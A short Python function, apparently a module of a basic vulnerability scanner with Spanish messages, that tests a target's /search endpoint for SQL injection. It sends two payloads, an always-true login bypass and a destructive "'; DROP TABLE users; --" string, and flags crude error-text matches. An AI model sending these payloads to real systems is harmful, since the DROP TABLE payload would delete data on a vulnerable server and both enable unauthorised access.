import requests

def execute(target):
    print(f"[INFO] Probando SQL Injection en: {target}")
    payloads = ["' OR '1'='1", "'; DROP TABLE users; --"]
    vulnerable = False

    for payload in payloads:
        url = f"http://{target}/search?q={payload}"
        try:
            response = requests.get(url, timeout=5)
            if "syntax error" in response.text or "database" in response.text.lower():
                vulnerable = True
                print(f"[ALERTA] SQL Injection detectada con payload: {payload}")
        except Exception as e:
            print(f"[ERROR] Error al probar el payload: {e}")
    return "Vulnerable a SQL Injection" if vulnerable else "No vulnerable"
